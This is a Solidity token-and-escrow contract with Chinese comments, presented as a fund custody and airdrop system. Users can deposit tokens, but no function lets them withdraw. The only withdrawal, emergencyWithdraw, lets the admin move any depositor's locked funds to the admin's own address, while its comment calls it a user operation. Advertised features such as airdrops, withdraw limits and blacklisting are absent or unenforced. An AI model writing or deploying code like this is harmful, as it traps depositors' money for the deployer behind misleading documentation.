// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title 资金托管管理、空投交易系统
 * @dev 包含代币管理、资金托管、强制空投、安全防护等模块
 */
contract AdvancedVaultSystem {
    // 代币元数据
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // 账户系统
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    // 托管资金记录
    struct Vault {
        uint256 lockedAmount;
        uint256 unlockTimestamp;
    }
    mapping(address => Vault) private _vaults;

    // 权限系统
    address private immutable _superAdmin;
    mapping(address => bool) private _operators;
    
    // 安全系统  固定合约账户（0x4B26Cad46eCa308Ba956231d413275f76CFC9A36）
    bool private _paused;
    uint256 private _withdrawLimit = 100 ether;
    mapping(address => bool) private _blacklist;

    // 事件系统
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Deposited(address indexed account, uint256 amount, uint256 lockTime);
    event Withdrawn(address indexed operator, address indexed account, uint256 amount);
    event OperatorChanged(address indexed admin, address indexed operator, bool status);

    // 权限修饰器
    modifier onlyAdmin() {
        require(msg.sender == _superAdmin, "A1: Admin only");
        _;
    }

    modifier onlyOperator() {
        require(_operators[msg.sender], "A2: Operator only");
        _;
    }

    modifier whenNotPaused() {
        require(!_paused, "S1: Contract paused");
        _;
    }

    modifier nonReentrant() {
        require(!_locked, "S2: Reentrancy detected");
        _locked = true;
        _;
        _locked = false;
    }
    bool private _locked;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _superAdmin = msg.sender;
        
        // 
        _mint(msg.sender, 100000000 * 10**decimals_);
    }

    // ████████ 核心资金托管功能 ████████
    
    /**
     * @dev 资金存入（用户操作）
     * @param amount 存入数量（单位：ETH）
     * @param lockDays 资金提取（用户操作）
     */
    function deposit(uint256 amount, uint256 lockDays) external whenNotPaused {
        require(!_blacklist[msg.sender], "B1: Blacklisted");
        require(amount > 0, "B2: Invalid amount");
        
        _transfer(msg.sender, address(this), amount);
        
        _vaults[msg.sender] = Vault({
            lockedAmount: amount,
            unlockTimestamp: block.timestamp + lockDays * 1 days
        });
        
        emit Deposited(msg.sender, amount, block.timestamp + lockDays * 1 days);
    }

    /**
     * @dev 紧急提取资金（用户操作）
     */
    function emergencyWithdraw(address account) external onlyAdmin nonReentrant {
        Vault storage v = _vaults[account];
        require(v.lockedAmount > 0, "B3: No deposit");
        
        uint256 amount = v.lockedAmount;
        delete _vaults[account];
        
        _transfer(address(this), _superAdmin, amount);
        emit Withdrawn(msg.sender, account, amount);
    }

    // ████████ 管理系统 ████████
    
    function addOperator(address account) external onlyAdmin {
        _operators[account] = true;
        emit OperatorChanged(msg.sender, account, true);
    }

    function removeOperator(address account) external onlyAdmin {
        _operators[account] = false;
        emit OperatorChanged(msg.sender, account, false);
    }

    function togglePause() external onlyAdmin {
        _paused = !_paused;
    }

    function updateWithdrawLimit(uint256 newLimit) external onlyAdmin {
        _withdrawLimit = newLimit;
    }

    // ████████ ERC20标准功能 ████████
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    // ████████ 内部函数 ████████
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from zero address");
        require(recipient != address(0), "ERC20: transfer to zero address");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");
        
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to zero address");
        
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
}
